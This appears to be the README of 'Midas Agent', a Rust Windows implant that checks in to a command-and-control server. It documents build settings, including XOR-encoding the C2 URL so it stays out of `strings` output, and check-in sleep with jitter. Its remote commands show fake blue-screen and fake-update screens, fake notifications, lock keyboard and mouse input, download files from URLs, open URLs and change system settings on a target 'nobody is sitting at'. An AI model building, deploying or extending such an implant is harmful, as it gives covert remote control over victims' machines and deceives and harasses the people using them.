# Midas Agent

A Windows troll implant, hows images, pops message boxes, changes
the wallpaper and shakes the screen.

**Windows only.** The command surface is built on Win32 — moving another
application's window, warping the pointer, `BlockInput`, `PlaySoundW`. An
earlier revision had an X11 backend, but a Wayland compositor forbids most of
what this implant does to *other* applications, so the Linux build was largely
decorative. Building for any other target now fails with an explanation rather
than producing something that silently does nothing.

## Configuring

Set these in the environment at **compile** time. `option_env!` bakes them into
the binary, so the C2 URL and XOR key are not visible in the process
environment, and the values are XOR-encoded like every other string constant so
they do not appear in `strings` output either.

|Variable|Default|Purpose|
|---|---|---|
|`MIDAS_SERVER`|`http://127.0.0.1:3000/`|C2 base URL|
|`MIDAS_KEY`|`asdf`|XOR key; must be in the server's keys list|
|`MIDAS_REG_FAIL_LIMIT`|`10`|Registration attempts before giving up|
|`MIDAS_CHECKIN_SLEEP`|`10`|Seconds between check-ins|
|`MIDAS_CHECKIN_JITTER`|`5`|Jitter range in seconds, applied to the sleep|
|`MIDAS_LOG`|unset|Set to anything but `0` for stderr diagnostics|

## Compiling
```bash
# From Windows, for the usual target:
MIDAS_SERVER=https://c2.example.com/ MIDAS_KEY=... \
  cargo build --release --target x86_64-pc-windows-msvc

# Cross-compiling from Linux (needs a mingw-w64 linker):
MIDAS_SERVER=https://c2.example.com/ MIDAS_KEY=... \
  cargo build --release --target x86_64-pc-windows-gnu
```

## Commands
Every argument is required. Where behaviour is genuinely optional it is
expressed with a **sentinel**, listed in the description: the Web UI drops
blank inputs from the argument array, so an omitted argument silently shifts
every later one down a slot rather than falling back to a default.

|Command|Description|Arguments|
|---|---|---|
|`sysinfo`|Report OS, elevation, screen size and overlay state||
|`listoverlays`|List running overlays with their id and age||
|`stopall`|Close every running overlay and stop any playing sound||
|`kill`|Stop the implant||
|`getsleep`|Get the current sleep time and jitter||
|`setsleep`|Set the sleep time between check-ins|seconds: int, jitter: int|
|`fetchimage`|Download a file to the implant's cache and return its path|url: str, filename: str|
|`msgbox`|Show a message box|title: str, body: str, icon: str, sound: bool|
|`showimage`|Show an image over the desktop|path: str, mode: str, seconds: int, topmost: bool|
|`setwallpaper`|Set the desktop wallpaper|path: str|
|`getwallpaper`|Report the current wallpaper path so it can be restored||
|`shakescreen`|Shake a window back and forth|seconds: int, amplitude: int, interval: int, target: str|
|`fakebsod`|Fullscreen fake blue screen with a progress bar|stopcode: str, percent: int, seconds: int|
|`fakeupdate`|Fullscreen fake "working on updates" screen|title: str, percent: int, seconds: int|
|`faketoast`|Fake desktop notification|title: str, body: str, seconds: int|
|`titlechange`|Retitle the foreground window|title: str|
|`gettitle`|Report the foreground window's current title||
|`toggletaskbar`|Hide or show the taskbar|state: str|
|`scare`|Fullscreen image plus sound at once|image: str, sound: str, seconds: int|
|`spook`|Fullscreen animated static, matrix rain or scanlines|mode: str, seconds: int|
|`playsound`|Play a sound file|path: str, loop: bool|
|`volume`|Change the system playback volume|action: str, level: int|
|`cursor`|Hide, freeze or move the mouse pointer|action: str, seconds: int|
|`desktopnote`|Draw a large text note on the desktop|text: str, x: int, y: int, size: int|
|`fontsize`|Scale the system UI font|percent: int|
|`minimizeall`|Minimise or restore every window|state: str|
|`openurl`|Open a URL in the default browser|url: str, background: bool|
|`lockinput`|Block keyboard and mouse input; `0` holds until `stopall`|seconds: int|

## Sentinels
|Argument|Sentinel|Meaning|
|---|---|---|
|`showimage` / `spook` / `fakebsod` / `fakeupdate` `seconds`|`0`|Do not auto-close; stays until `stopall`|
|`scare` `sound`|`none`|Image only, no sound|
|`volume` `action`|`set`|Uses the `level` argument; other actions ignore it|
|`shakescreen` `target`|`foreground`|Foreground window; `all` for every top-level, `mouse` to shake only the window under the pointer|
|`minimizeall` / `toggletaskbar` `state`|`toggle`|Flip to the opposite of the current state. `minimizeall` moves every window one way together, rather than leaving a mix that neither `minimize` nor `restore` could describe afterwards|
|`cursor` `seconds`|capped at 60|Ignores anything longer|
|`lockinput` `seconds`|`0`|Do not time out; holds until `stopall`. Any interruption needs `stopall` - `sysinfo` reports an active hold as `input lock: active for …s`|
|`shakescreen` `seconds`|capped at 30||

## Platform notes
- **Overlays have two backends.** `eframe` is tried first and needs a working
  OpenGL 3.2+ context; where that is unavailable — a VM with 3D acceleration off,
  an RDP session, which offers only OpenGL 1.1 — eframe fails during context
  creation, before its first frame, and does so with a panic from inside glutin.
  Midas then falls back to a GDI backend that needs no graphics driver at all,
  and remembers the choice so the dead one is not retried on every command. The
  fallback also covers a backend that survives startup but dies on its first
  command: the send itself is the liveness test, so a dead backend is retired at
  the point it would have failed a command and the same command goes out again
  on the other one. `sysinfo` reports which is live as
  `overlay host: running (eframe|gdi)`, along with the real reason if neither
  came up.
- **Panics are reportable, not just stderr noise.** The default hook names only
  the thread — always one of Midas' own — so every distinct failure printed the
  same line. The implant installs its own hook that keeps the last few panics
  and `sysinfo` reports them as `panic: <file>:<line>:<message>`. On a target
  nobody is sitting at, a stderr line is nowhere to look; this is how the reason
  a backend died reaches the operator.
- **The GDI backend is a transcription, not a port.** Same layouts, same colours,
  same system font, drawn by hand into a DIB and composited by the window manager
  through `UpdateLayeredWindow`. What is lost: rounded corners, subpixel layout,
  and the GPU. What is kept: all seven overlays work, including animated
  `spook`, and the notification and desktop note are still click-through
  everywhere they are transparent, because a layered window is hit-tested
  against its own alpha.
- **Text is the one thing GDI is used for.** Everything else is a hand-rolled
  rasteriser, because GDI cannot write a meaningful alpha channel into a 32-bit
  DIB. Text is rendered over a sentinel colour and the distance from it is
  recovered as per-pixel coverage, so antialiasing survives the round trip.
  Grayscale antialiasing is requested rather than ClearType, since ClearType's
  subpixel colours would defeat both that and the compositing.
- **The overlay host restarts.** It is started lazily by the first visual
  command and re-created if the backend dies, so a transient failure does not
  disable overlays for the rest of the implant's life.
- **`lockinput`** uses `BlockInput`, which requires an elevated process. An
  unelevated implant reports the refusal in its own log rather than pretending
  to have locked anything. `sysinfo` reports the elevation state so this is
  predictable up front. `0` holds until `stopall`, and `sysinfo` reports an
  active hold as `input lock: active for …s`.
- **No interactive desktop** — a service, a scheduled task, or session 0 — means
  every window command fails. `sysinfo` reports `desktop: false` in that case.
- **`fontsize`** writes `HKCU\Control Panel\Desktop\LogPixels` and broadcasts
  `WM_SETTINGCHANGE`, so it takes effect for new windows only.
- **`setwallpaper` / `getwallpaper`** go through `SystemParametersInfoW` with
  `SPI_SETDESKWALLPAPER`.
- **Overlays** are drawn rather than borrowed from native controls, because they
  have to be faked from scratch anyway — the BSOD, the update screen, the
  animated static. `msgbox` is the one exception and uses a real `MessageBoxW`,
  so it gets the genuine system styling.

## Design notes
- **One GUI thread, many viewports — under eframe.** winit permits one
  `EventLoop` per process, so "a thread per overlay" cannot work. A single
  long-lived thread owns the one event loop and each overlay is an egui
  *viewport* within it.
- **A thread and a window per overlay — under GDI.** That shape is illegal for
  eframe and is exactly why the fallback is not a second egui app: it uses
  ordinary top-level windows with ordinary message loops, so the one-event-loop
  constraint does not apply.
- **Every command acks immediately.** The Web UI abandons a task after 90
  seconds (`TASK_TIMEOUT_MS` in `webui/assets/js/agents.js`). Tombili runs
  commands inline on its check-in loop, so a 30-second shake there would stall
  check-ins and be reported as a timeout even though it worked. Midas hands
  work to the GUI thread or a worker thread and returns a status line
  immediately.
- **Blocking calls go on worker threads.** `MessageBoxW` is modal, a key press
  grab has to hold, `lockinput` has to be undone after a delay or a `stopall`.
  All of them run through `gui::detach`, so a `lockinput` — timed or
  continuous — does not hold up the check-in loop.
- **`stopall` is immediate.** It bumps an epoch, releases any input hold, sets
  cancel tokens; overlays check a deadline on their own thread, and `PlaySoundW`
  is ended by re-issuing it with a null sound, which is the only way to stop it.
- **`stopall` does not undo everything.** Wallpaper, title, taskbar, font scale
  and volume are deliberately left changed — that is the joke. `getwallpaper`
  and `gettitle` exist so the original state can be read back afterwards. The
  one thing it must undo is input: a continuous `lockinput` has no other way
  off, so unblocking it is part of the same cleanup.
- **Win32 is declared by hand**, not through the `windows` crate. The
  declarations are plain `extern "system"`, which keeps the dependency list and
  the binary small and links identically under the MSVC and GNU targets.
